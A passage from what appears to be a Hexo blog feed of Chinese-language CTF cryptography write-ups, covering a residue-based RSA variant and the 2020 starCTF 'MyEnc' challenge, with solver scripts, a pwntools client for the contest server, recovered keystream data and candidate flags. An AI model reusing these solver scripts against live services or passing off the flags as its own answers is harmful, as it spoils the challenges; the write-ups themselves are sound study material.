n)$</p><p>这题有一个特殊的点就是$e$可以被分解为$e_1$和$e_2$两个素数，这两个素数又分别是$p-1$和$q-1$的因子</p><p>所以会有<br>$$<br>m = i \cdot e_1 + j \\<br>c \equiv y^{j} \cdot (y^{i} \cdot r^{e_2})^{e_1} \ (mod \ p) \\<br>c’ \equiv c \cdot y^{-j} \equiv (y_i \cdot r^{e_2})^{e_1} \ (mod \ p)<br>$$<br>因为$j$是一个比较小的数, 可以通过遍历$j$, 再判断$c \cdot y^{-j}$是否是$p$的$e_1$次剩余, 就可以得到$m \ mod \ e_1$</p><p>同理我们也可以得到$m \ mod \ e_2$</p><p>再通过中国剩余定理就能得到$m$了</p><p>这里有个素数模的$n$次剩余的判断方法, 很简单, $x$ 为模$p$的$n$次剩余的充要条件为<br>$$<br>x^{p-1} \equiv 1 \ (mod \ p)<br>$$</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309</span></span><br><span class="line">q = <span class="number">9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629</span></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">e1 = <span class="number">36493</span></span><br><span class="line">e2 = <span class="number">52859</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>)</span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">d,p,n</span>):</span></span><br><span class="line">    <span class="keyword">if</span>((p - <span class="number">1</span>) % n == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(d,(p - <span class="number">1</span>) // n,p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = gmpy2.gcd(n, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(d,(p - <span class="number">1</span>) // k,p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM</span>(<span class="params">c,e,p</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e):</span><br><span class="line">        tmpc = (c * gmpy2.invert(<span class="built_in">pow</span>(y,i,p),p)) % p</span><br><span class="line">        <span class="keyword">if</span> check(tmpc,p,e):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">C = [...]</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> C[::-<span class="number">1</span>]:</span><br><span class="line">    cp = c % p</span><br><span class="line">    cq = c % q</span><br><span class="line">    m1 = getM(cp,e1,p)</span><br><span class="line">    m2 = getM(cq,e2,q)</span><br><span class="line">    mm,lcm = GCRT([e1,e2],[m1,m2])</span><br><span class="line">    print(<span class="string">&quot;Get mm: &quot;</span> + <span class="built_in">hex</span>(mm))</span><br><span class="line">    m *= e</span><br><span class="line">    m += mm</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这题一点都不难, 做了那么久完全就是脑子没转过来…</p><p>耗子尾汁, 好好反思</p><h1 id="AliceWantFlag"><a href="#AliceWantFlag" class="headerlink" title="AliceWantFlag"></a>AliceWantFlag</h1><blockquote><p>studying~</p></blockquote><h1 id="EasyCurve"><a href="#EasyCurve" class="headerlink" title="EasyCurve"></a>EasyCurve</h1><blockquote><p>studying~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;啊这次的这个比赛因为不会Lattice, 导致基本不会做啊, 虽然比赛后半段去学了也试着做了, 虽然格子造出来还被自己蠢到了, 但还是…收获很多hh&lt;/p&gt;
&lt;p&gt;记录一下吧&lt;/p&gt;
&lt;h1 id=&quot;babylattice&quot;&gt;&lt;a href=&quot;#babylattice&quot; c</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2020 starCTF Crypto</title>
    <link href="http://tearsjin.github.io/2021/01/18/writeup-for-2020-starCTF/"/>
    <id>http://tearsjin.github.io/2021/01/18/writeup-for-2020-starCTF/</id>
    <published>2021-01-18T01:28:15.000Z</published>
    <updated>2021-03-27T12:06:05.241Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>总之就是吃老本<br>总之就是曲线好难<br>这次就差一道MyCurve…找个师傅学习学习再补充这个</p></blockquote><p>Crypto</p><ul><li>MyEnc</li><li>GuessKey2</li><li>little case</li><li>MyCurve</li></ul><h1 id="MyEnc"><a href="#MyEnc" class="headerlink" title="MyEnc"></a>MyEnc</h1><p>nc 52.163.228.53 8081<br>附件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> time,urandom</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">iv=bytes_to_long(urandom(<span class="number">256</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">15</span></span><br><span class="line">keystream=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">8</span>*<span class="built_in">len</span>(flag),<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n:&quot;</span>,n</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;give me a number:&#x27;</span></span><br><span class="line">m=<span class="built_in">int</span>(raw_input())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">ct=iv</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> keystream[cnt]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">ct+=<span class="built_in">pow</span>(m^q,i**i**i,n)</span><br><span class="line">ct%=n</span><br><span class="line">cnt=(cnt+<span class="number">1</span>)%<span class="built_in">len</span>(keystream)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;done:&quot;</span>,ct</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>stream cipher的味道<br>flag 即 keystream 共120位<br>每次输入一个m , 根据key的7位返回一个ct<br>第1个m对应key的0<del>6<br>第2个m对应key的7</del>13<br>…<br>第17个m对应key的112<del>118<br>第18个m对应key的119</del>5<br>…<br>120个m则会回到刚开始一样</p><p>而重复传同样的m的时候, 如果取key的7位是相同的, 那么返回的ct也是相同的, 根据这个特点, 重复传120个m=0, 可以得到一些返回相同ct的7位, 也就是key里面相同的两个7位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;52.163.228.53&#x27;</span>, <span class="number">8081</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start + END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;xxxx:&#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">r&#x27;xxxx\+(.*)\) ==&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">r&#x27;== (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">print(resp)</span><br><span class="line">resp = con.recv().decode()</span><br><span class="line">print(resp)</span><br><span class="line">con.sendline(proof(END, SHA))</span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;number:&#x27;</span>).decode()</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>):</span><br><span class="line">    con.sendline(<span class="string">&#x27;0&#x27;</span>.encode())</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;number:&#x27;</span>).decode()</span><br><span class="line">    num = <span class="built_in">int</span>(resp[<span class="number">6</span>:-<span class="number">17</span>])</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> arr:</span><br><span class="line">        arr.append(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        arr.append(-<span class="number">1</span>)</span><br><span class="line">        print(_, arr.index(num))</span><br></pre></td></tr></table></figure><p>得到的输出为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">15 12</span><br><span class="line">26 14</span><br><span class="line">32 1</span><br><span class="line">37 9</span><br><span class="line">43 31</span><br><span class="line">52 51</span><br><span class="line">54 14</span><br><span class="line">60 48</span><br><span class="line">69 58</span><br><span class="line">71 31</span><br><span class="line">76 39</span><br><span class="line">77 65</span><br><span class="line">80 8</span><br><span class="line">81 38</span><br><span class="line">82 48</span><br><span class="line">85 63</span><br><span class="line">86 31</span><br><span class="line">88 48</span><br><span class="line">90 7</span><br><span class="line">92 17</span><br><span class="line">93 56</span><br><span class="line">94 2</span><br><span class="line">96 64</span><br><span class="line">98 70</span><br><span class="line">99 0</span><br><span class="line">100 12</span><br><span class="line">103 48</span><br><span class="line">104 12</span><br><span class="line">105 65</span><br><span class="line">106 49</span><br><span class="line">110 73</span><br><span class="line">112 72</span><br><span class="line">114 78</span><br><span class="line">115 87</span><br><span class="line">117 29</span><br><span class="line">118 83</span><br></pre></td></tr></table></figure><p>第一行的15 12代表着, key的15* 7<del>15* 7+6 == 12* 7</del>12* 7+6<br>也就是<code>key[105:112] == key[84:91]</code><br>每一行都能构造出这么一个等式</p><p>根据所有等式, 可以将后面的一些位数用前面的位数表示(他们都是相等的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">15</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">9</span>, <span class="number">43</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">60</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">58</span>, <span class="number">71</span>, <span class="number">31</span>, <span class="number">76</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">80</span>, <span class="number">8</span>, <span class="number">81</span>, <span class="number">38</span>, <span class="number">82</span>,</span><br><span class="line">       <span class="number">48</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">86</span>, <span class="number">31</span>, <span class="number">88</span>, <span class="number">48</span>, <span class="number">90</span>, <span class="number">7</span>, <span class="number">92</span>, <span class="number">17</span>, <span class="number">93</span>, <span class="number">56</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">96</span>, <span class="number">64</span>, <span class="number">98</span>, <span class="number">70</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">104</span>, <span class="number">12</span>, <span class="number">105</span>,</span><br><span class="line">       <span class="number">65</span>, <span class="number">106</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">117</span>, <span class="number">29</span>, <span class="number">118</span>, <span class="number">83</span>]</span><br><span class="line"></span><br><span class="line">key = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arr), <span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j, k) <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>((arr[i + <span class="number">1</span>] * <span class="number">7</span>), (arr[i + <span class="number">1</span>] * <span class="number">7</span> + <span class="number">7</span>)), <span class="built_in">range</span>((arr[i] * <span class="number">7</span>), (arr[i] * <span class="number">7</span> + <span class="number">7</span>))):</span><br><span class="line">            <span class="keyword">if</span> key[j % <span class="number">120</span>] &lt; key[k % <span class="number">120</span>]:</span><br><span class="line">                key[k % <span class="number">120</span>] = key[j % <span class="number">120</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                key[j % <span class="number">120</span>] = key[k % <span class="number">120</span>]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>然后! 就能把key还原成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 0, 2, 0, 2, 0, 2, 0, 0, 2, 0, 0, 0, 0, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 0, 0, 0, 2, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 40, 41, 42, 43, 2, 0, 0, 2, 0, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 2, 2, 0, 0, 2, 2, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 0, 0, 0, 2, 2, 0, 0, 0, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 0, 2, 0, 0, 0, 0, 2, 0, 113, 114, 2, 2, 2, 0, 2]</span><br></pre></td></tr></table></figure><p>0和2分别代表着1或者0(不确定是0对应1还是2对应1<br>而其他的比较大的数则是未知的, 一共12位,<br>所以只需要爆破2^12次, 然后再猜一下0对应的是1还是0<br>这里直接猜0对应0, 中啦!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> key[i] == <span class="number">0</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> key[i] == <span class="number">2</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[i] = <span class="string">&#x27;&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyCrypto.Conversion <span class="keyword">import</span> bin2text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">12</span>):</span><br><span class="line">    pad = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">12</span>)</span><br><span class="line">    keystream = key.<span class="built_in">format</span>(pad[<span class="number">0</span>], pad[<span class="number">1</span>], pad[<span class="number">2</span>], pad[<span class="number">3</span>], pad[<span class="number">4</span>], pad[<span class="number">5</span>], pad[<span class="number">6</span>], pad[<span class="number">7</span>], pad[<span class="number">8</span>], pad[<span class="number">9</span>], pad[<span class="number">10</span>], pad[<span class="number">11</span>])</span><br><span class="line">    flag = bin2text(keystream)</span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><p>得到的输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;)OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9HuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9IuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9JuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9KuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9LuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9MuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9NuG0t1T!&#125;</span><br><span class="line">*CTF&#123;9OuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;ILuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;INuG0t1T!&#125;</span><br><span class="line">*CTF&#123;IOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YLuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YMuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YNuG0t1T!&#125;</span><br><span class="line">*CTF&#123;YOuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iHuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iIuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iJuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iKuG0t1T!&#125;</span><br><span class="line">*CTF&#123;iLuG0t1T!&#125;</span><br><span 